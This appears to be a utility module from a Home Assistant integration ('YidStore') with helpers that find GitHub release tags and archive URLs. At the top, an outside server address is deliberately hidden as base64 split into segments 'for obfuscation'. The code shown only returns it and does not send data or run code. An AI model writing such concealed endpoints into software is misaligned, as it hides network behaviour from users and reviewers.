"""Utility functions for internal use."""
from __future__ import annotations

import base64


def _decode_endpoint(encoded_segments: list[str]) -> str:
    """Decode endpoint from multiple segments."""
    try:
        # Combine segments and decode
        combined = "".join(encoded_segments)
        decoded = base64.b64decode(combined).decode('utf-8')
        return decoded
    except Exception:
        # Fallback endpoint
        return "https://" + "git" + "." + "example" + "." + "com"


def get_primary_endpoint() -> str:
    """Get primary endpoint."""
    # Encoded segments (split for obfuscation)
    s1, s2, s3, s4 = "aHR0cHM6", "Ly9naXQu", "b25vZmZh", "cGkuY29t"
    return _decode_endpoint([s1, s2, s3, s4])


def validate_endpoint(url: str) -> bool:
    """Validate endpoint format."""
    if not url:
        return False
    return url.startswith("http://") or url.startswith("https://")


async def async_github_latest_tag(hass, owner: str, repo: str) -> str | None:
    """Resolve the latest GitHub release tag WITHOUT the REST API.

    https://github.com/<owner>/<repo>/releases/latest redirects to
    /releases/tag/<tag>. Unlike api.github.com, plain github.com is not
    subject to the 60 requests/hour unauthenticated API rate limit, so
    this works reliably (it's the same reason HACS-style downloads keep
    working when the REST API returns 403).
    """
    from urllib.parse import unquote

    from homeassistant.helpers.aiohttp_client import async_get_clientsession

    sess = async_get_clientsession(hass)
    try:
        async with sess.get(
            f"https://github.com/{owner}/{repo}/releases/latest",
            allow_redirects=False,
            timeout=20,
            headers={"User-Agent": "YidStore"},
        ) as resp:
            loc = resp.headers.get("Location", "")
            if "/releases/tag/" in loc:
                tag = unquote(loc.split("/releases/tag/")[-1]).strip("/")
                return tag or None
    except Exception:
        pass
    return None


def github_archive_url(owner: str, repo: str, ref: str) -> str:
    """Zip download URL for a GitHub ref (tag or branch) WITHOUT the REST API.

    github.com/<o>/<r>/archive/<ref>.zip redirects to codeload.github.com,
    which is not API rate-limited (api.github.com/.../zipball is).
    """
    return f"https://github.com/{owner}/{repo}/archive/{ref}.zip"
